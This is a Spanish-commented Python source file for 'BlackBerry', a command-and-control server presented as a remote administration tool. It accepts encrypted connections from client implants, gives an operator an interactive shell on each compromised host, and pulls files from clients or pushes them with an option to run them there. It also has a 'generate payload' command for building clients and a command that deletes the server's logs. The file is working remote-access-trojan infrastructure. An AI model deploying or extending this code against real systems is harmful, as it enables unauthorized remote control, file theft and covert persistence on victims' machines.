#!/usr/bin/env python3
#lunes 21 de julio de 2025
"""
BlackBerry - Servidor de administración remota

Este script implementa un servidor que escucha conexiones entrantes, establece
una sesión cifrada (usando RSA para el intercambio de claves AES) y permite la
ejecución de comandos en clientes remotos. Además, incluye transferencia de archivos.
"""

import socket
import threading
import os
import struct
import time
import logging
import hashlib
import subprocess
import readline
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography import x509
from cryptography.hazmat.backends import default_backend
from colores import *

# Configuración del logging sin códigos de color para el archivo de log.
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    handlers=[
        logging.FileHandler("logs/BlackBerryServer.log"),
        logging.StreamHandler()
    ]
)

HOST = '0.0.0.0'
PORT = 9949
server_socket = None
connections = {}  # {id_conexion: (socket, dirección, aes_key)}
conn_lock = threading.Lock()
conn_id_counter = 0

COMMANDS = [
    "help", "info", "list", "select", "rsa keys", "set port", "set host",
    "generate payload", "exit", "banner"
]

# Autocompletado con readline
readline.parse_and_bind("tab: complete")
readline.set_completer(lambda text, state: [cmd for cmd in COMMANDS if cmd.startswith(text)][state] if state < len([cmd for cmd in COMMANDS if cmd.startswith(text)]) else None)
readline.set_history_length(1000)


def BlackBerrybanner():
    try:
        import banner
        banner.main()
    except ImportError:
        print(f"{B_BLUE}{BOLD}Bienvenido a BlackBerry.{RESET}")
    except Exception as e:
        logging.exception("Error mostrando banner: %s", e)


def generate_rsa_keys():
    """Genera un par de claves RSA y retorna la privada y la pública en formato PEM."""
    private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    public_key = private_key.public_key()
    public_pem = public_key.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    )
    logging.info("Par RSA generado exitosamente.")
    return private_key, public_pem

try:
    SERVER_PRIVATE_KEY, SERVER_PUBLIC_PEM = generate_rsa_keys()
except Exception as e:
    logging.critical("No se pudo generar el par de claves RSA. Terminando ejecución.")
    exit(1)


def recvall(sock, n):
    """Recibe exactamente n bytes del socket."""
    data = b''
    try:
        while len(data) < n:
            packet = sock.recv(n - len(data))
            if not packet:
                logging.warning("Socket cerrado durante la recepción de datos.")
                return None
            data += packet
    except socket.timeout:
        logging.warning("Timeout al recibir datos.")
        return None
    except Exception as e:
        logging.exception("Error en recvall: %s", e)
        return None
    return data


def send_encrypted_message(sock, plaintext, aes_key):
    """Envía un mensaje cifrado con AESGCM."""
    try:
        aesgcm = AESGCM(aes_key)
        nonce = os.urandom(12)
        ciphertext = aesgcm.encrypt(nonce, plaintext.encode(), None)
        message = nonce + ciphertext
        sock.sendall(struct.pack('!I', len(message)) + message)
    except Exception as e:
        logging.exception("Error enviando mensaje cifrado: %s", e)


def receive_encrypted_message(sock, aes_key):
    """Recibe y descifra un mensaje cifrado con AESGCM."""
    try:
        raw_len = recvall(sock, 4)
        if not raw_len:
            return None
        msg_len = struct.unpack('!I', raw_len)[0]
        data = recvall(sock, msg_len)
        if not data:
            return None
        nonce = data[:12]
        ciphertext = data[12:]
        aesgcm = AESGCM(aes_key)
        plaintext = aesgcm.decrypt(nonce, ciphertext, None)
        return plaintext.decode()
    except Exception as e:
        logging.exception("Error recibiendo mensaje cifrado: %s", e)
        return None


def accept_connections(server):
    """Acepta conexiones entrantes y establece la sesión cifrada."""
    global conn_id_counter
    while True:
        try:
            client_socket, address = server.accept()
            client_socket.settimeout(10)
            logging.info("Nueva conexión desde %s:%s", address[0], address[1])

            # Enviar la clave pública al cliente
            client_socket.sendall(b"PUBKEY:" + SERVER_PUBLIC_PEM)

            # Recibir la clave AES cifrada
            raw_len = recvall(client_socket, 4)
            if not raw_len:
                logging.error("No se recibió la longitud de la clave AES.")
                client_socket.close()
                continue

            key_len = struct.unpack('!I', raw_len)[0]
            encrypted_aes_key = recvall(client_socket, key_len)
            if not encrypted_aes_key:
                logging.error("No se recibió la clave AES cifrada.")
                client_socket.close()
                continue

            try:
                aes_key = SERVER_PRIVATE_KEY.decrypt(
                    encrypted_aes_key,
                    padding.OAEP(
                        mgf=padding.MGF1(algorithm=hashes.SHA256()),
                        algorithm=hashes.SHA256(),
                        label=None
                    )
                )
            except Exception as e:
                logging.exception("Error desencriptando la clave AES de %s: %s", address, e)
                client_socket.close()
                continue

            with conn_lock:
                cid = conn_id_counter
                connections[cid] = (client_socket, address, aes_key)
                logging.info("Sesión #%s establecida con %s:%s", conn_id_counter, address[0], address[1])
                conn_id_counter += 1

            threading.Thread(target=handle_client, args=(client_socket, aes_key, cid), daemon=True).start()
        except Exception as e:
            logging.exception("Error al aceptar conexión: %s", e)


def handle_client(client_socket, aes_key, cid):
    """Maneja la conexión activa con un cliente."""
    try:
        while True:
            time.sleep(1)
    except Exception as e:
        logging.exception("Error en comunicación con cliente %s: %s", cid, e)
    finally:
        with conn_lock:
            if cid in connections:
                del connections[cid]
        try:
            client_socket.close()
        except Exception as e:
            logging.exception("Error cerrando socket de cliente %s: %s", cid, e)
        logging.info("Conexión con cliente %s cerrada", cid)


def receive_file(client_socket, aes_key, file_name):
    """
    Recibe un archivo enviado por el cliente.
    Se espera un encabezado "SIZE <size> <hash>" y luego los datos sin cifrar.
    """
    try:
        header = receive_encrypted_message(client_socket, aes_key)
        if not header or not header.startswith("SIZE "):
            err = f"{ALERT} {RED}[ ERROR ] Encabezado incorrecto.{RESET}"
            logging.error("Encabezado incorrecto.")
            return err

        _, sz, expected_hash = header.split()
        file_size = int(sz)
        received = 0
        sha = hashlib.sha256()
        with open(file_name, 'wb') as f:
            while received < file_size:
                raw_len = recvall(client_socket, 4)
                if not raw_len:
                    break
                packet_len = struct.unpack('!I', raw_len)[0]
                packet = recvall(client_socket, packet_len)
                if not packet:
                    break
                nonce = packet[:12]
                ct = packet[12:]
                aesgcm = AESGCM(aes_key)
                chunk = aesgcm.decrypt(nonce, ct, None)
                f.write(chunk)
                sha.update(chunk)
                received += len(chunk)

        actual_hash = sha.hexdigest()
        if received != file_size or actual_hash != expected_hash:
            err = f"{ALERT} {RED}[ ERROR ] Hash o tamaño incorrecto.{RESET}"
            logging.error(err)
            return err

        msg = f"{B_GREEN}[ SUCCESS ] Archivo '{file_name}' recibido correctamente.{RESET}"
        send_encrypted_message(client_socket, msg, aes_key)
        logging.info(msg)
        return msg
    except Exception as e:
        error_str = f"{ALERT} {RED}Error al recibir archivo: {e}{RESET}"
        logging.exception(error_str)
        return error_str


# Tamaño de chunk para envío de archivos
CHUNK_SIZE = 64 * 1024  # 64 KB


def send_file_to_client(sock, aes_key, file_name):
    """
    Envía un archivo al cliente de forma cifrada (chunked AES-GCM).
    """
    try:
        if not os.path.isfile(file_name):

            send_encrypted_message(sock, f"{ALERT} [-] Archivo no encontrado.", aes_key)
            return

        file_size = os.path.getsize(file_name)
        sha = hashlib.sha256()
        with open(file_name, 'rb') as f:
            for chunk in iter(lambda: f.read(CHUNK_SIZE), b''):
                sha.update(chunk)
        file_hash = sha.hexdigest()

        # Enviar encabezado cifrado
        header = f"SIZE {file_size} {file_hash}"
        send_encrypted_message(sock, header, aes_key)

        # Enviar datos por chunks
        with open(file_name, 'rb') as f:
            while True:
                chunk = f.read(CHUNK_SIZE)
                if not chunk:
                    break
                aesgcm = AESGCM(aes_key)
                nonce = os.urandom(12)
                ct = aesgcm.encrypt(nonce, chunk, None)
                packet = nonce + ct
                sock.sendall(struct.pack('!I', len(packet)))
                sock.sendall(packet)

        logging.info("%s[+] Archivo '%s' enviado correctamente.%s", B_GREEN, file_name, RESET)
    except Exception as e:
        logging.exception("Error al enviar archivo: %s", e)
        send_encrypted_message(sock, f"{ALERT} [-] Error al enviar archivo.", aes_key)



def rebind_server(new_host, new_port):
    """Reconfigura el servidor para escuchar en un nuevo host y/o puerto."""
    global server_socket, HOST, PORT
    try:
        if server_socket:
            server_socket.close()
        HOST = new_host
        PORT = new_port
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.bind((HOST, PORT))
        server_socket.listen(5)
        logging.info("Servidor rebind a %s:%s", HOST, PORT)
        threading.Thread(target=accept_connections, args=(server_socket,), daemon=True).start()
    except Exception as e:
        logging.exception("Error al rebind del servidor: %s", e)

def mostrar_info_cert(ruta_cert):
    # Carga el certificado en PEM o DER
    with open(ruta_cert, 'rb') as f:
        datos = f.read()
    try:
        cert = x509.load_pem_x509_certificate(datos, default_backend())
    except ValueError:
        cert = x509.load_der_x509_certificate(datos, default_backend())

    # Imprime los campos principales
    print("Información del certificado:")
    print("  Sujeto       :", cert.subject.rfc4514_string())
    print("  Emisor       :", cert.issuer.rfc4514_string())
    print("  Válido desde :", cert.not_valid_before)
    print("  Válido hasta :", cert.not_valid_after)
    print("  Número serie :", cert.serial_number)
    print("  Algoritmo    :", cert.signature_hash_algorithm.name)
    print()

def mostrar_info_key(ruta_key):
    # Carga la clave privada (sin contraseña)
    with open(ruta_key, 'rb') as f:
        datos = f.read()
    try:
        clave = serialization.load_pem_private_key(
            datos,
            password=None,
            backend=default_backend()
        )
    except ValueError:
        print("Error: la clave está cifrada o en un formato no soportado.")
        return

    # Imprime tipo y tamaño de la clave
    print("Información de la clave privada:")
    print("  Tipo de clave :", type(clave).__name__)
    if hasattr(clave, 'key_size'):
        print("  Tamaño         :", f"{clave.key_size} bits")
    print("+========================================================================================")

def interactive_shell():
    """Bucle principal de interacción con el operador."""
    BlackBerrybanner()
    while True:
        try:
            cmd = input(f"{B_BLUE}{BOLD}BlackBerry> {RESET}").strip()
        except (KeyboardInterrupt, EOFError):
            print(f"\n{YELLOW}{BOLD}^C interrupcion detectada, escribe 'exit' para salir.{RESET}")
            continue
        if cmd == "help" or cmd == "ayuda":
            help_text = f"""
{b_white}{BOLD}BlackBerry  - Herramienta de administración remota{RESET}

{b_green}Comandos:{RESET}
  {b_green}help{RESET}{b_white}                   -> Muestra esta ayuda.{RESET}
  {b_green}proxy-tls{RESET}{b_white}              -> inicia el proxy TLS(todo cifrado){RESET}
  {b_green}loggin{RESET}{b_white}                 -> Imprime el log completo del servidor.{RESET}
  {b_green}loggin proxy{RESET}{b_white}            -> Imprime el log completo del proxy.{RESET}
  {b_green}list{RESET}{b_white}                   -> Lista conexiones activas.{RESET}
  {b_green}select <ID>{RESET}{b_white}            -> Interactúa con una sesión de cliente.{RESET}
  {b_green}rsa keys{RESET}{b_white}               -> Imprime las claves RSA generadas.{RESET}
  {b_green}cert{RESET}{b_white}                   -> Imprime info de el certificado y clave del proxy.{RESET}
  {b_green}new cert{RESET}{b_white}               -> Crea un nuevo ceritificao personalizado en la carpeta cert/{RESET}
  {b_green}set port <PUERTO>{RESET}{b_white}      -> Cambia el puerto de escucha.{RESET}
  {b_green}set host <HOST>{RESET}{b_white}        -> Cambia el host de escucha.{RESET}
  {b_green}generate payload{RESET}{b_white}       -> Genera un payload de cliente.{RESET}
  {b_red}exit{RESET}                   -> Cierra el servidor.{RESET}"""
            print(help_text)
            continue
        if cmd == "proxy-tls":
              try:
                  subprocess.Popen(["python3", "BlackBerry_TLSProxyGUI.py"])
              except Exception as e:
                   print(f"[!] Error al lanzar GUI: {e}")
                   try:
                       subprocess.Popen(["python3", "BlackBerry_TLSProxy.py"],
                       stdout=subprocess.DEVNULL,
                       stderr=subprocess.DEVNULL
            )
                   except Exception as e2:
                       print(f"[X] Falló también la versión CLI: {e2}")
        elif cmd == "clean":
           os.system("rm logs/BlackBerryServer.log")
           os.system("rm logs/BlackBerryTLSProxy.log")
        elif cmd == "loggin":
            try:
                with open("logs/BlackBerryServer.log", "r") as f:
                    log_content = f.read()
                print(f"{CYAN}{UNDERLINE}---- LOG DEL SERVIDOR ----{RESET}")
                print(log_content)
                print(f"{CYAN}{UNDERLINE}---- FIN DEL LOG ----{RESET}")
            except Exception as e:
                logging.exception("Error al leer el log: %s", e)
                print(f"{ALERT} {RED}Error al leer el log del servidor: {e}{RESET}")

        elif cmd == "loggin proxy":
            try:
                with open("logs/BlackBerryTLSProxy.log", "r") as f:
                    log_content = f.read()
                print(f"{CYAN}{UNDERLINE}---- LOG DEL PROXY DEL SERVIDOR ----{RESET}")
                print(log_content)
                print(f"{CYAN}{UNDERLINE}---- FIN DEL LOG DEL PROXY  ----{RESET}")
            except Exception as e:
                logging.exception("Error al leer el log: %s", e)
                print(f"{ALERT} {RED}Error al leer el log del proxy: {e}{RESET}")

        elif cmd == "banner":
            BlackBerrybanner()

        elif cmd == "list" or cmd == "clients":
            with conn_lock:
                if connections:
                    for cid, (_, addr, aes_key) in connections.items():
                        # Mostrar la clave AES en texto claro (hexadecimal)
                        aes_hex = aes_key.hex()
                        print(f"{B_GREEN}{cid}{RESET}: {B_BLUE}{addr[0]}{RESET} - [{B_YELLOW}{addr[1]}{RESET}] | AES Key: {B_MAGENTA}{aes_hex}{RESET}")
                else:
                    print(f"{YELLOW}No hay conexiones activas.{RESET}")
        elif cmd == "new cert" or cmd == "cert new":
            subprocess.run(["python3", "certG.py"])
 
        elif cmd == "cert":
            CERT_PATH = 'cert/BlackBerry_Server.crt'
            KEY_PATH  = 'cert/BlackBerry_Server.key'
            mostrar_info_cert(CERT_PATH)
            mostrar_info_key(KEY_PATH)
        elif cmd == "rsa keys":
            # Mostrar claves en PEM
            priv_pem = SERVER_PRIVATE_KEY.private_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PrivateFormat.PKCS8,
                encryption_algorithm=serialization.NoEncryption()
            )
            print(f"{B_GREEN}--- RSA Private Key (PEM) ---{RESET}\n{priv_pem.decode()}")
            print(f"{B_GREEN}--- RSA Public Key (PEM) ---{RESET}\n{SERVER_PUBLIC_PEM.decode()}")
            continue
        elif cmd.startswith("select "):
            parts = cmd.split()
            if len(parts) != 2:
                print(f"{ALERT} {RED}Uso: select <ID>{RESET}")
                continue
            try:
                cid = int(parts[1])
            except ValueError:
                print(f"{ALERT} {RED}ID inválido.{RESET}")
                continue

            with conn_lock:
                if cid not in connections:
                    print(f"{ALERT} {RED}Conexión no encontrada.{RESET}")
                    continue
                client_socket, addr, aes_key = connections[cid]

            print(f"{B_GREEN}Conectado a sesión #{cid} ({addr}). Escribe 'exit' para salir.{RESET}")
            try:
                while True:
                    send_encrypted_message(client_socket, "GET_CWD", aes_key)
                    current_dir = receive_encrypted_message(client_socket, aes_key)
                    if current_dir is None:
                        print(f"{ALERT} {RED}La conexión se ha cerrado.{RESET}")
                        with conn_lock:
                            connections.pop(cid, None)
                        break
                    prompt = f"{B_BLUE}{cid} ({addr[0]}) {MAGENTA}[{current_dir}]{RESET} >> "
                    command = input(prompt).strip()
                    if command == "":
                        continue
                    if command.lower() == "exit":
                        break
                    if command.startswith("get "):
                        file_name = command.split(" ", 1)[1].strip()
                        send_encrypted_message(client_socket, f"GET_FILE {file_name}", aes_key)
                        print(f"{B_GREEN}[+] Iniciando descarga de '{file_name}'...{RESET}")
                        file_received_msg = receive_file(client_socket, aes_key, file_name)
                        print(file_received_msg)
                        continue
                    if command.startswith("put "):
                        parts = command.split()
                        file_name = parts[1] if len(parts) > 1 else None
                        if not file_name or not os.path.exists(file_name):
                           print(f"{ALERT} {RED}El archivo '{file_name}' no existe en el cliente.{RESET}")
                           continue

                        execute_remotely = "-exc" in parts

                        cmd_str = f"PUT_FILE {file_name}"
                        if execute_remotely:
                            cmd_str += " -exc"

                        send_encrypted_message(client_socket, cmd_str, aes_key)
                        send_file_to_client(client_socket, aes_key, file_name)
                        continue

                    logging.info("Enviando comando al cliente %s: %s", cid, command)
                    print(f"{CYAN}[INFO] Comando enviado: {command}{RESET}")
                    send_encrypted_message(client_socket, command, aes_key)
                    response = receive_encrypted_message(client_socket, aes_key)
                    if response is None:
                        print(f"{ALERT} {RED}La conexión se ha cerrado.{RESET}")
                        with conn_lock:
                            connections.pop(cid, None)
                        break
                    print(response)
            except Exception as e:
                logging.exception("Error durante la interacción con la sesión %s: %s", cid, e)

        elif cmd.startswith("set port "):
            parts = cmd.split()
            if len(parts) != 3:
                print(f"{ALERT} {RED}Uso: set port <PUERTO>{RESET}")
                continue
            try:
                new_port = int(parts[2])
                rebind_server(HOST, new_port)
            except ValueError:
                print(f"{ALERT} {RED}El puerto debe ser un número entero.{RESET}")
            except Exception as e:
                logging.exception("Error al cambiar el puerto: %s", e)

        elif cmd.startswith("set host "):
            parts = cmd.split()
            if len(parts) != 3:
                print(f"{ALERT} {RED}Uso: set host <HOST>{RESET}")
                continue
            new_host = parts[2]
            try:
                rebind_server(new_host, PORT)
            except Exception as e:
                logging.exception("Error al cambiar el host: %s", e)

        elif cmd == "generate payload" or cmd == "payload":
            try:
                import payloadG
                payloadG.generate_payload()
            except ImportError as ie:
                logging.exception("No se pudo importar payload_generator: %s", ie)
                print(f"{ALERT} {RED}Error: No se encontró el módulo payload_generator.{RESET}")
            except Exception as e:
                logging.exception("Error al generar el payload: %s", e)
                print(f"{ALERT} {RED}Error al generar el payload.{RESET}")

        elif cmd.lower() == "exit":
            print(f"{YELLOW}{BOLD}Saliendo de BlackBerry.{RESET}")
            with conn_lock:
                for cid, (sock, _, _) in list(connections.items()):
                    try:
                        sock.close()
                    except Exception as e:
                        logging.exception("Error cerrando conexión %s: %s", cid, e)
                connections.clear()
            if server_socket:
                try:
                    server_socket.close()
                except Exception as e:
                    logging.exception("Error cerrando socket del servidor: %s", e)
            break

        else:
            # Ejecuta comandos localmente
            try:
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                if result.stdout:
                    print(f"{B_GREEN}{result.stdout}{RESET}")
                if result.stderr:
                    print(f"{RED}{result.stderr}{RESET}")
            except Exception as e:
                logging.exception("Error al ejecutar el comando: %s", e)
                print(f"{ALERT} {RED}Error al ejecutar el comando: {e}{RESET}")


def main():
    global server_socket
    try:
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind((HOST, PORT))
        server_socket.listen(5)
        logging.info("Servidor escuchando en %s:%s", HOST, PORT)
    except Exception as e:
        logging.critical("Error iniciando el servidor: %s", e, exc_info=True)
        return

    try:
        threading.Thread(target=accept_connections, args=(server_socket,), daemon=True).start()
    except Exception as e:
        logging.critical("Error al iniciar el hilo de conexiones: %s", e, exc_info=True)
        return

    interactive_shell()

if __name__ == '__main__':
    try:
        main()
    except Exception as e:
        logging.critical("Excepción no capturada en la ejecución principal: %s", e, exc_info=True)
